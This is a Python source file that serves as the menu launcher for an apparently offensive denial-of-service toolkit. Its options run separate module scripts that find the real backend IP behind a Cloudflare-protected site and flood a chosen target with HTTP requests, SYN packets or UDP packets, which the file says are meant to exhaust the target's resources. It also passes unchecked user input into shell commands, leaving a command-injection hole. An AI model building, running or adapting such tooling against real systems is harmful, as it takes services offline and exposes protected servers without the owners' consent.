import os
import re
import platform
import colorama
from colorama import Fore, Back, Style



R='\033[1;31m'
B='\033[1;34m'
Y='\033[1;33m'
G='\033[1;32m'
C='\033[1;36m'
N='\033[0m'



def main():

	global option
	option = input('Choose from the following options #~: ')

	if option:
		if option == '1':
		  cloudflarebust()

		elif option == '2':
			httpdos()

		elif option == '3':
			synflood()

		elif option == "4":
			udpflood()






def cloudflarebust():
	print("This will search the cloudflare protected website for misconfigured DNS and will extract backend real IP.")
	cloudbam = input("Select a Target Ex: example.com (no http/https and www ) : ")
	os.system("cd modules && python cloudflare.py --target %s"%cloudbam)


def httpdos():
	print("This will flood the websites with 100's and 1000's of http header requests and will try to suck all of it's resources.")
	http = input("Select a Target ( Ex http/site.suffix ) Don't use www in anyway  : ")
	os.system("cd modules && python http_flood.py %s"% http)




def synflood():
	print("This will bombard the host with infinite syn packets and tries to exhaust the resources.")
	synboom = input("Enter the host name : ")
	synlol=input("Enter the port : ")
	os.system("cd modules && python syn.py %s %s "% (synboom, synlol))


def udpflood():
	print("This will send infinite UDP packets and tries to exhaust host's resource fully.")
	os.system("cd modules && python udp.py  ")




if __name__ == '__main__':
	main()
